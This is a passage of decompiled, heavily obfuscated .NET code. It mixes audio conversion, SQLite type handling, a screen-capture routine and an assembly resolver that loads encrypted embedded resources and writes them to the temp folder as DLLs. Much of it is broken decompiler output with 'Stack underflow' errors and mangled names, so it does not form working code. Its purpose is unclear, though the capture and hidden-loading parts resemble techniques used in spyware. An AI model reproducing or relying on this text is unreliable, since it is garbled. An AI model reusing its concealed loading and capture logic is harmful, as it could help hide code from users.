			//IL_0062: Incompatible stack heights: 0 vs 7
			//IL_0065: Incompatible stack heights: 0 vs 1
			global::_000E._001F result;
			try
			{
			}
			finally
			{
				result = (_0090_0002._0099_0005(_0002, IntPtr.Zero) ? new global::_000E._001F(_0002, _000F_0017_0006: true) : null);
			}
			if ((int)/*Error near IL_0024: Stack underflow*/ != 0)
			{
				_ = null;
				_ = 9;
				_ = null;
				_ = null;
				_ = null;
				_ = null;
				_ = null;
				global::_0017._0080._0001(_0003: new global::_0002._001A(_0087_000F: new object[2]
				{
					_0091._0080_0004(typeof(global::_0017._0080).TypeHandle),
					_0002
				}, _0014_0019_0006: (global::_000E._001D)/*Error near IL_0057: Stack underflow*/, _001E_009E_0005: (StateChangeEventArgs)/*Error near IL_0057: Stack underflow*/, _0004_0018_0006: (IDbTransaction)/*Error near IL_0057: Stack underflow*/, _0008_0019: (IDbCommand)/*Error near IL_0057: Stack underflow*/, _001D_0017_0006: (IDataReader)/*Error near IL_0057: Stack underflow*/, _0015_0019_0006: (CriticalHandle)/*Error near IL_0057: Stack underflow*/, _0019_008E_0003: (string)/*Error near IL_0057: Stack underflow*/), _0002: (global::_0017._0080)/*Error near IL_005c: Stack underflow*/);
			}
			return result;
		}

		static void _0001(global::_0017._0080 _0002, _001F._001A P_1)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			if (((_001F._001A)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				((global::_0017._0080)/*Error near IL_0027: Stack underflow*/)._0001();
			}
			P_1._0001 = null;
			P_1._0001 = null;
		}

		static void _0001(global::_0017._007F._0006 P_0)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			int num = ((global::_0017._007F._0006)/*Error near IL_0009: Stack underflow*/)._0007;
			((global::_0017._007F._0006)/*Error near IL_0011: Stack underflow*/)._0007 = num | 0xC;
		}

		static string _0001(string _0002)
		{
			//IL_006f: Incompatible stack heights: 0 vs 2
			//IL_0076: Incompatible stack heights: 0 vs 1
			//IL_0079: Incompatible stack heights: 0 vs 1
			_ = global::_001C._0096_0003;
			/*Error near IL_0076: Stack underflow*/((string)/*Error near IL_0076: Stack underflow*/);
			if ((int)/*Error near IL_000b: Stack underflow*/ != 0)
			{
				return (string)/*Error near IL_000e: Stack underflow*/;
			}
			_0002 = global::_0003._007E_0080(_0002, _0080._0014._0001(107353556), _0080._0014._0001(107353523));
			_0002 = global::_0003._007E_0080(_0002, _0080._0014._0001(107396986), string.Empty);
			int num = _0086_0002._007E_008E_0005(_0002, ',');
			if (num != -1)
			{
				_0002 = _0087_0002._007E_008F_0005(_0002, 0, num);
			}
			return _0002;
		}

		static bool _0001(ref string _0002, ref string _0003)
		{
			//IL_00e2: Incompatible stack heights: 0 vs 1
			//IL_00ec: Incompatible stack heights: 0 vs 1
			//IL_00f6: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107353486);
			_0018._0001((string)/*Error near IL_00ec: Stack underflow*/, (string)null);
			if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
			{
				return false;
			}
			_0018._0001();
			string text = (string)/*Error near IL_001a: Stack underflow*/;
			if (text == null)
			{
				return false;
			}
			string[] array = new string[2]
			{
				_0018._0001(),
				global::_0002._007E_0019(_0097_0004._001F_000E())
			};
			string[] array2 = new string[2]
			{
				_0018._0001(),
				_0018._0001((string)null)
			};
			string[] array3 = array;
			foreach (string text2 in array3)
			{
				if (text2 == null)
				{
					continue;
				}
				string[] array4 = array2;
				foreach (string text3 in array4)
				{
					if (text3 != null)
					{
						string text4 = _0018._0001(_0018._0001(_0018._0001(text2, text3), text));
						if (global::_001C._0097_0003(text4))
						{
							_0002 = text2;
							_0003 = text3;
							return true;
						}
					}
				}
			}
			return false;
		}

		static void _0001(global::_0017._007F._0007._0001 P_0)
		{
			//IL_0254: Incompatible stack heights: 0 vs 1
			//IL_0260: Incompatible stack heights: 0 vs 1
			int num = ((global::_0017._007F._0007._0001)/*Error near IL_000a: Stack underflow*/)._0001.Length;
			int[] array = new int[/*Error near IL_001b: Stack underflow*/];
			int num2 = 0;
			int num3 = 0;
			for (int i = 0; i < num; i++)
			{
				int num4 = P_0._0001[i];
				if (num4 != 0)
				{
					int num5 = num2++;
					int num6;
					while (num5 > 0 && P_0._0001[array[num6 = (num5 - 1) / 2]] > num4)
					{
						array[num5] = array[num6];
						num5 = num6;
					}
					array[num5] = i;
					num3 = i;
				}
			}
			while (num2 < 2)
			{
				int num7 = ((num3 < 2) ? (++num3) : 0);
				array[num2++] = num7;
			}
			P_0._0002 = Math.Max(num3 + 1, P_0._0001);
			int num8 = num2;
			int[] array2 = new int[4 * num2 - 2];
			int[] array3 = new int[2 * num2 - 1];
			int num9 = num8;
			for (int j = 0; j < num2; j++)
			{
				int num10 = (array2[2 * j] = array[j]);
				array2[2 * j + 1] = -1;
				array3[j] = P_0._0001[num10] << 8;
				array[j] = j;
			}
			do
			{
				int num11 = array[0];
				int num12 = array[--num2];
				int num13 = 0;
				int num14;
				for (num14 = 1; num14 < num2; num14 = num14 * 2 + 1)
				{
					if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
					{
						num14++;
					}
					array[num13] = array[num14];
					num13 = num14;
				}
				int num15 = array3[num12];
				while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
				{
					array[num14] = array[num13];
				}
				array[num14] = num12;
				int num16 = array[0];
				num12 = num9++;
				array2[2 * num12] = num11;
				array2[2 * num12 + 1] = num16;
				int num17 = Math.Min(array3[num11] & 0xFF, array3[num16] & 0xFF);
				num15 = (array3[num12] = array3[num11] + array3[num16] - num17 + 1);
				num13 = 0;
				for (num14 = 1; num14 < num2; num14 = num13 * 2 + 1)
				{
					if (num14 + 1 < num2 && array3[array[num14]] > array3[array[num14 + 1]])
					{
						num14++;
					}
					array[num13] = array[num14];
					num13 = num14;
				}
				while ((num14 = num13) > 0 && array3[array[num13 = (num14 - 1) / 2]] > num15)
				{
					array[num14] = array[num13];
				}
				array[num14] = num12;
			}
			while (num2 > 1);
			_0018._0001(array2, P_0);
		}

		[DllImport("mfplat.dll", EntryPoint = "MFCreateMemoryBuffer", ExactSpelling = true, PreserveSig = false)]
		static extern void _0001(int _0002, out global::_0018._0015 _0003);

		static int _0001(global::_0017._007F._0007._0001 P_0)
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected I4, but got Unknown
			//IL_0035: Incompatible stack heights: 0 vs 1
			int result = 0;
			for (int i = 0; i < P_0._0001.Length; i++)
			{
				short num = P_0._0001[i];
				byte num2 = P_0._0001[i];
				result = /*Error near IL_001c: Stack underflow*/+ num * num2;
			}
			return result;
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamReset")]
		static extern MmResult _0001(IntPtr _0002, int _0003);

		[DllImport("winmm.dll", EntryPoint = "midiStreamPause")]
		static extern MmResult _0001(IntPtr _0002);

		static void _0001(MmResult _0002, string _0003)
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				throw new global::_0013._0001((MmResult)/*Error near IL_000d: Stack underflow*/, (string)/*Error near IL_000d: Stack underflow*/);
			}
		}

		static int _0001(global::_0010._001C _0002, CommandBehavior P_1)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected I4, but got Unknown
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0010._001C)/*Error near IL_0045: Stack underflow*/);
			_0014 obj = _0018._0001((CommandBehavior)(/*Error near IL_0008: Stack underflow*/ | 8 | 1), _0002);
			try
			{
				while (global::_001B._007E_008E_0003(obj))
				{
				}
				return global::_001A._007E_001F_0003(obj);
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
		}

		static _001B._0004? _0001(int _0002, int _0003, _001E._0004 P_2)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_001E._0004)/*Error near IL_0007: Stack underflow*/)._0001;
				if (((global::_0013._0005)/*Error near IL_0012: Stack underflow*/)._0002((int)/*Error near IL_0012: Stack underflow*/, (int)/*Error near IL_0012: Stack underflow*/, out _001B._0004 value) == 0)
				{
					_0018._0001(ref value);
					return value;
				}
			}
			catch (COMException ex)
			{
				if (ex._0001() != -2147220986)
				{
					throw;
				}
			}
			return null;
		}

		static void _0001(double _0002, double _0003, global::_000E._0019._0001 P_2)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Invalid comparison between Unknown and F8
			//IL_00c6: Incompatible stack heights: 0 vs 2
			//IL_00cc: Incompatible stack heights: 0 vs 1
			//IL_00d6: Expected F8, but got Unknown
			//IL_00d6: Incompatible stack heights: 0 vs 1
			_ = global::_0015._0001_0003;
			double num = ((global::_000E._0019._0001)/*Error near IL_0014: Stack underflow*/)._0001;
			_003F val = /*Error near IL_0015: Stack underflow*/- num;
			/*Error near IL_00d6: Stack underflow*/((double)val);
			if ((double)/*Error near IL_0025: Stack underflow*/ >= 1E-06)
			{
				P_2._0001 = _0002;
				global::_0015 obj = global::_0015._009B_0002;
				double num2 = _0002 * Math.PI;
				double num3 = Math.Cos(num2);
				double num4 = obj(num2) / (2.0 * _0003);
				double num5 = 1.0 / (1.0 + num4);
				P_2._0005 = (1.0 - num3) * num5;
				P_2._0006 = (P_2._0004 = P_2._0005 * 0.5);
				P_2._0002 = -2.0 * num3 * num5;
				P_2._0003 = (1.0 - num4) * num5;
			}
		}

		static IEnumerable<global::_0014._0002> _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			_0018._0001(global::_0004._0003._0001);
			return (IEnumerable<global::_0014._0002>)/*Error near IL_0008: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_update_hook")]
		static extern IntPtr _0001(IntPtr _0002, global::_0018._001B _0003, IntPtr _0004);

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_00ad: Incompatible stack heights: 0 vs 2
			//IL_00b7: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_00b7: Stack underflow*/((IntPtr)/*Error near IL_00b7: Stack underflow*/);
			float* ptr = (float*)/*Error near IL_00bd: Stack underflow*/;
			byte*[] array = new byte*[_0004];
			for (int i = 0; i < _0004; i++)
			{
				array[i] = (byte*)_0010_0005._0096_000E(_0003[i]);
			}
			for (int j = 0; j < _0005; j++)
			{
				for (int k = 0; k < _0004; k++)
				{
					float* num = ptr;
					ptr = num + 1;
					int num2 = _0018._0001((double)(*num));
					*(array[k]++) = (byte)num2;
					*(array[k]++) = (byte)(num2 >> 8);
					*(array[k]++) = (byte)(num2 >> 16);
				}
			}
		}

		static Bitmap _0001(int _0002, global::_0002._0001 P_1)
		{
			//IL_0042: Unknown result type (might be due to invalid IL or missing references)
			//IL_0048: Expected O, but got Unknown
			//IL_0165: Unknown result type (might be due to invalid IL or missing references)
			//IL_016c: Expected O, but got Unknown
			//IL_017d: Incompatible stack heights: 0 vs 2
			//IL_0187: Incompatible stack heights: 0 vs 1
			_ = _0011_0002._007E_0013_0005;
			_0011_0006._009F_000F();
			/*Error near IL_0187: Stack underflow*/((object)/*Error near IL_0187: Stack underflow*/);
			Bitmap val = new Bitmap(((Rectangle)/*Error near IL_001a: Stack underflow*/).Width, _0011_0002._007E_0013_0005(_0011_0006._009F_000F()).Height, (PixelFormat)137224);
			try
			{
				Graphics val2 = _0012_0006._0001_0010((Image)(object)val);
				try
				{
					_0013_0006._007E_0002_0010(val2, 0, 0, 0, 0, _0011_0002._007E_0013_0005(_0011_0006._009F_000F()).Size, (CopyPixelOperation)13369376);
					global::_0002._0001._0001 obj = default(global::_0002._0001._0001);
					obj._0001 = _009C_0004._0084_000E(_0091._0080_0004(typeof(global::_0002._0001._0001).TypeHandle));
					if (_0018._0001(out obj) && obj._0002 == 1)
					{
						_0018._0001(_0096_0002._007E_0007_0006(val2), obj._0001._0001, obj._0001._0002, obj._0001);
						global::_0008._007E_001C_0002(val2);
					}
				}
				finally
				{
					if (val2 != null)
					{
						global::_0008._007E_0098(val2);
					}
				}
				int height = global::_001A._007E_007F_0003(val) * (_0002 * 100 / global::_001A._007E_007F_0003(val)) / 100;
				int width = _0002 + _0002 * 100 / global::_001A._007E_0080_0003(val) * _0002 / 100 + 100;
				return new Bitmap((Image)(object)val, new Size(width, height));
			}
			catch
			{
				return null;
			}
		}

		static double _0001(int _0002, int _0003)
		{
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Expected F8, but got Unknown
			//IL_0030: Incompatible stack heights: 0 vs 5
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Expected F8, but got Unknown
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = 0.54;
			_ = 0.46;
			_ = global::_0015._009A_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0023: Stack underflow*/;
			_ = /*Error near IL_0024: Stack underflow*/* num;
			_003F val = /*Error near IL_0028: Stack underflow*/- 1;
			_003F val2 = /*Error near IL_002a: Stack underflow*// (double)val;
			/*Error near IL_003a: Stack underflow*/((double)val2);
			_003F val3 = /*Error near IL_002d: Stack underflow*/* /*Error near IL_002d: Stack underflow*/;
			return /*Error near IL_002e: Stack underflow*/- val3;
		}

		static IntPtr _0001(global::_0007._0014 P_0)
		{
			//IL_000f: Incompatible stack heights: 0 vs 2
			//IL_0016: Incompatible stack heights: 0 vs 1
			_ = _0099._008C_0004;
			global::_0004._000F._0001<IntPtr>();
			/*Error near IL_0016: Stack underflow*/((int)/*Error near IL_0016: Stack underflow*/);
			return (IntPtr)/*Error near IL_000a: Stack underflow*/;
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_006f: Incompatible stack heights: 0 vs 2
			//IL_0079: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_0079: Stack underflow*/((IntPtr)/*Error near IL_0079: Stack underflow*/);
			float* ptr = (float*)/*Error near IL_007f: Stack underflow*/;
			short*[] array = new short*[_0004];
			for (int i = 0; i < _0004; i++)
			{
				array[i] = (short*)_0010_0005._0096_000E(_0003[i]);
			}
			for (int j = 0; j < _0005; j++)
			{
				for (int k = 0; k < _0004; k++)
				{
					ref short* reference = ref array[k];
					short* ptr2 = reference;
					reference = ptr2 + 1;
					float* num = ptr;
					ptr = num + 1;
					*ptr2 = _0018._0001((double)(*num));
				}
			}
		}

		static _001D._0016 _0001(float _0002, float _0003, float _0004, float _0005)
		{
			//IL_0014: Incompatible stack heights: 0 vs 3
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			new _001D._0016();
			_0018._0001((_001D._0016)/*Error near IL_0012: Stack underflow*/, (float)/*Error near IL_0012: Stack underflow*/, (float)/*Error near IL_0012: Stack underflow*/, (float)/*Error near IL_0012: Stack underflow*/, _0004);
			return (_001D._0016)/*Error near IL_0013: Stack underflow*/;
		}

		static void _0001(short[] _0002, int _0003, int _0004, global::_0004._0008 P_3)
		{
			//IL_013c: Incompatible stack heights: 0 vs 1
			//IL_0148: Incompatible stack heights: 0 vs 2
			if (((global::_0004._0008)/*Error near IL_000a: Stack underflow*/)._0001._0003 == 16)
			{
				for (int i = 0; i < _0003; i++)
				{
					_ = _009F_0002._007E_001C_0006;
					BinaryWriter binaryWriter = ((global::_0004._0008)/*Error near IL_002a: Stack underflow*/)._0001;
					byte[] array = _0018._0001(P_3, _0002[i + _0004]);
					/*Error near IL_003a: Stack underflow*/(binaryWriter, array);
				}
				P_3._0001 += _0003 * 2;
			}
			else if (P_3._0001._0003 == 24)
			{
				for (int j = 0; j < _0003; j++)
				{
					byte[] array2 = _0012_0003._008E_0006(65535 * _0002[j + _0004]);
					P_3._0001[2] = array2[1];
					P_3._0001[1] = array2[2];
					P_3._0001[0] = array2[3];
					_009F_0002._007E_001C_0006(P_3._0001, P_3._0001);
				}
				P_3._0001 += _0003 * 3;
			}
			else
			{
				if (P_3._0001._0003 != 32 || P_3._0001._0001 != WaveFormatEncoding.Extensible)
				{
					throw new InvalidOperationException(_0080._0014._0001(107353469));
				}
				for (int k = 0; k < _0003; k++)
				{
					_009F_0002._007E_001C_0006(P_3._0001, _0018._0001(65535 * _0002[k + _0004], P_3));
				}
				P_3._0001 += _0003 * 4;
			}
		}

		static bool _0001(Assembly _0002, Assembly _0003)
		{
			return true;
		}

		[DllImport("winmm.dll", EntryPoint = "midiInGetID")]
		static extern MmResult _0001(IntPtr _0002, out int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string _0001(SQLiteConnectionFlags _0002, DbType _0003, global::_0017._0080 _0004)
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I8, but got Unknown
			//IL_00df: Incompatible stack heights: 0 vs 1
			//IL_00e5: Incompatible stack heights: 0 vs 1
			string text = null;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0)
			{
				SQLiteConnectionFlags num = _0004.Flags;
				_0002 = (SQLiteConnectionFlags)(/*Error near IL_0019: Stack underflow*/ | num);
				if ((_0002 & SQLiteConnectionFlags.UseConnectionTypes) == SQLiteConnectionFlags.UseConnectionTypes)
				{
					global::_0001._001D obj = _0004._0001;
					global::_0006._0018 obj2 = default(global::_0006._0018);
					if (obj != null && _0018._0001(obj, _0003, ref obj2))
					{
						return obj2._0001;
					}
				}
				text = _0004.DefaultTypeName;
			}
			if ((_0002 & SQLiteConnectionFlags.NoGlobalTypes) == SQLiteConnectionFlags.NoGlobalTypes)
			{
				if (text != null)
				{
					return text;
				}
				text = _0018._0001(_0004);
				_0018._0001(_0002, text, _0003);
				return text;
			}
			object obj3;
			_0091_0002._009C_0005(obj3 = global::_0001._001A._0001);
			try
			{
				if (global::_0001._001A._0001 == null)
				{
					global::_0001._001A._0001 = _0018._0001();
				}
				global::_0006._0018 obj4 = default(global::_0006._0018);
				if (_0018._0001(global::_0001._001A._0001, _0003, ref obj4))
				{
					return obj4._0001;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj3);
			}
			if (text != null)
			{
				return text;
			}
			text = _0018._0001(_0004);
			_0018._0001(_0002, text, _0003);
			return text;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(_0013 _0002, _0019._007F _0003, global::_0012._0014 _0004, SQLiteConnectionFlags _0005)
		{
			//IL_011d: Incompatible stack heights: 0 vs 1
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_0131: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0007: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107358497);
				new ArgumentNullException((string?)/*Error near IL_0131: Stack underflow*/);
				throw /*Error near IL_0017: Stack underflow*/;
			}
			if (_0003 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403438));
			}
			if (_0004 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403445));
			}
			global::_0016._001C obj = _0003._0001;
			_0004._0001 = _0002;
			_0004._0001 = _0005;
			_0004._0001 = ((obj == global::_0016._001C._0001) ? new _0019._001F(_0004._0001) : null);
			_0004._0002 = ((obj == global::_0016._001C._0002) ? new _0019._001F(_0004._0002) : null);
			_0004._0001 = ((obj == global::_0016._001C._0002) ? new global::_0002._001C(_0004._0001) : null);
			_0004._0001 = ((obj == global::_0016._001C._0003) ? new global::_0006._001A(_0004._0001) : null);
			_0004._0002 = ((obj == global::_0016._001C._0003) ? new global::_0006._001A(_0004._0002) : null);
			string text = _0003._0001;
			if (obj != global::_0016._001C._0003)
			{
				bool flag = _0004 is _001C._0017;
				_0002._0001(text, _0003._0001, flag, _0004._0001, _0004._0002, _0004._0001, _0008: true);
			}
			else
			{
				_0002._0001(text, _0004._0001, _0004._0002, _0005: true);
			}
		}

		[DllImport("winmm.dll", EntryPoint = "waveInUnprepareHeader")]
		static extern MmResult _0001(IntPtr _0002, _007F._0006 _0003, int _0004);

		static string _0001(int _0002, _001F._0019 P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (P_1._0001[_0002]._0001 != null)
			{
				return _009E_0003._007E_0001_0008(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			throw new InvalidCastException();
		}

		static void _0001()
		{
			//IL_0037: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0015._0016._0001;
			/*Error near IL_003e: Stack underflow*/((object)/*Error near IL_003e: Stack underflow*/);
			try
			{
				if (global::_0015._0016._0002 == null)
				{
					global::_0015._0016._0002 = _0018._0001;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		[DllImport("ole32.dll", EntryPoint = "PropVariantClear")]
		static extern int _0001(ref _0019._001A _0002);

		static int _0001(int _0002, _0080._0004 _0003, int _0004, string P_3)
		{
			//IL_0004: Unknown result type (might be due to invalid IL or missing references)
			//IL_006d: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0073: Expected I4, but got Unknown
			int num = /*Error near IL_0005: Stack underflow*/* /*Error near IL_0005: Stack underflow*/;
			if (num % 4 != 0)
			{
				throw new ArgumentOutOfRangeException(P_3, _009D._0093_0004(_0080._0014._0001(107353404), P_3, num));
			}
			if (_0004 < 0 || _0004 > _0003._0001.Length / _0002)
			{
				throw new ArgumentOutOfRangeException(P_3, _009D._0093_0004(_0080._0014._0001(107352783), P_3, _0003._0001.Length / _0002));
			}
			return num;
		}

		static object _0001(_001F._0019 _0002, int P_1)
		{
			//IL_008c: Incompatible stack heights: 0 vs 1
			//IL_0092: Incompatible stack heights: 0 vs 2
			//IL_0098: Incompatible stack heights: 0 vs 1
			_ = ((_001F._0019)/*Error near IL_000a: Stack underflow*/)._0001;
			if (((_001F._0019._0001[])/*Error near IL_0010: Stack underflow*/)[/*Error near IL_0010: Stack underflow*/]._0003 == -1)
			{
				return DBNull.Value;
			}
			_0018._0001((_001F._0019)/*Error near IL_002a: Stack underflow*/, P_1);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _008F_0004._007E_0015_000E(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			if (_0018._0001(_0002, P_1))
			{
				return DBNull.Value;
			}
			return _0018._0001(_0002, P_1);
		}

		unsafe static Assembly _0001(object _0002, ResolveEventArgs _0003)
		{
			//IL_0254: Incompatible stack heights: 0 vs 2
			//IL_025e: Incompatible stack heights: 0 vs 1
			_001A._0015._0001 obj = default(_001A._0015._0001);
			_ = ref obj;
			_ = ((ResolveEventArgs)/*Error near IL_025e: Stack underflow*/).Name;
			*(_001A._0015._0001*)/*Error near IL_0268: Stack underflow*/ = new _001A._0015._0001((string)/*Error near IL_0268: Stack underflow*/);
			string s = obj._0001(_0002: false);
			string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
			string[] array = "e2VhMzk5ODkwLTc0NjUtNDE4ZC1hMmFiLWI4MDUzYjJlNjZlOX0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{aea39d11-223d-4904-9725-0092da3cc59b},e2VhMzk5ODkwLTc0NjUtNDE4ZC1hMmFiLWI4MDUzYjJlNjZlOX0=,[z]{aea39d11-223d-4904-9725-0092da3cc59b}".Split(new char[1] { ',' });
			string text2 = string.Empty;
			bool flag = false;
			bool flag2 = false;
			for (int i = 0; i < array.Length - 1; i += 2)
			{
				if (array[i] == text)
				{
					text2 = array[i + 1];
					break;
				}
			}
			if (text2.Length == 0 && obj._0003.Length == 0)
			{
				text = Convert.ToBase64String(Encoding.UTF8.GetBytes(obj._0001));
				for (int j = 0; j < array.Length - 1; j += 2)
				{
					if (array[j] == text)
					{
						text2 = array[j + 1];
						break;
					}
				}
			}
			if (text2.Length > 0)
			{
				if (text2[0] == '[')
				{
					int num = text2.IndexOf(']');
					string text3 = text2.Substring(1, num - 1);
					flag = text3.IndexOf('z') >= 0;
					flag2 = text3.IndexOf('t') >= 0;
					text2 = text2.Substring(num + 1);
				}
				lock (_001A._0015._0001)
				{
					if (_001A._0015._0001.ContainsKey(text2))
					{
						return _001A._0015._0001[text2];
					}
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream != null)
					{
						int num2 = (int)manifestResourceStream.Length;
						byte[] array2 = new byte[num2];
						manifestResourceStream.Read(array2, 0, num2);
						if (flag)
						{
							array2 = _0018._0001(array2);
						}
						Assembly assembly = null;
						if (!flag2)
						{
							try
							{
								assembly = Assembly.Load(array2);
							}
							catch (FileLoadException)
							{
								flag2 = true;
							}
							catch (BadImageFormatException)
							{
								flag2 = true;
							}
						}
						if (flag2)
						{
							try
							{
								string text4 = $"{Path.GetTempPath()}{text2}\\";
								Directory.CreateDirectory(text4);
								string text5 = text4 + obj._0001 + ".dll";
								if (!File.Exists(text5))
								{
									FileStream fileStream = File.OpenWrite(text5);
									fileStream.Write(array2, 0, array2.Length);
									fileStream.Close();
									_0018._0001(text5, (string)null, 4);
									_0018._0001(text4, (string)null, 4);
								}
								assembly = Assembly.LoadFile(text5);
							}
							catch
							{
							}
						}
						_001A._0015._0001[text2] = assembly;
						return assembly;
					}
				}
			}
			return null;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static int _0001(int _0002, int _0003, int _0004)
		{
			//IL_0004: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 2
			_ = /*Error near IL_0005: Stack underflow*/+ /*Error near IL_0005: Stack underflow*/;
			return _0018._0001((int)/*Error near IL_000c: Stack underflow*/, (int)/*Error near IL_000c: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._0080 _0002)
		{
			//IL_009a: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_00a4: Stack underflow*/);
			global::_0010._001C obj = (global::_0010._001C)/*Error near IL_00aa: Stack underflow*/;
			_0082_0003._007E_0011_0007(obj, _0080._0014._0001(107352718));
			global::_001A._007E_001A_0003(obj);
			_0082_0003._007E_0011_0007(obj, _0080._0014._0001(107352613));
			global::_001A._007E_001A_0003(obj);
			_0082_0003._007E_0011_0007(obj, _0080._0014._0001(107353048));
			global::_001A._007E_001A_0003(obj);
			_0082_0003._007E_0011_0007(obj, _0080._0014._0001(107352907));
			global::_001A._007E_001A_0003(obj);
		}

		static void _0001(global::_0010._0010 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0010._0010)/*Error near IL_0007: Stack underflow*/)._0001);
			_0080._0014._0001(107352318);
			_0018._0001((MmResult)/*Error near IL_0015: Stack underflow*/, (string)/*Error near IL_0015: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(BinaryReader _0002, global::_0001._0015 P_1)
		{
			//IL_0049: Incompatible stack heights: 0 vs 2
